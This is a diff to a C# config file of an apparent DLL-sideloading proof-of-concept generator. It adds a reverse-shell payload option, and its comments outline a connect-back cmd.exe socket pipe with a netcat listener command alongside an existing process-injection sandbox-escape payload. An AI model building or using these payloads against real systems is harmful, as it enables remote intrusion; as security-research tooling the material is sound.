@@ -57,6 +57,13 @@ public class TemplateConfig
     // Newlines and quotes are escaped for C string literal embedding.
     public string MessageBoxTitle { get; set; } = "DllSidecar PoC {Researcher}";
     public string MessageBoxBody { get; set; } = "DLL Sideloading PoC\nResearcher: {Researcher}\nDllSidecar — BugAInters 2026";
+
+    // ReverseShell payload — connect-back TCP cmd.exe pipe. Host accepts
+    // hostnames or dotted-quad IPv4; Port is the listener port the researcher
+    // will netcat / ncat on. Defaults are placeholders the user must change
+    // per PoC; ConfigPage exposes them as global defaults.
+    public string ReverseShellHost { get; set; } = "127.0.0.1";
+    public int ReverseShellPort { get; set; } = 4444;
 }
 
 public enum PayloadType
@@ -68,7 +75,11 @@ public enum PayloadType
     // Scans siblings for one we can OpenProcess(ALL_ACCESS) + VirtualAllocEx
     // RWX, then remote-thread executes CreateProcessA with WinSta0\Default
     // desktop so the spawned cmd is visible to the user.
-    SandboxEscape
+    SandboxEscape,
+    // TCP reverse shell: WSASocket → connect → CreateProcessA("cmd.exe")
+    // with hStdIn/Out/Err piped to the socket. Listener side: nc -lvnp PORT.
+    // Host/port configured globally via PayloadConfig.ReverseShellHost/Port.
+    ReverseShell
 }
 
 public enum ThreadMode
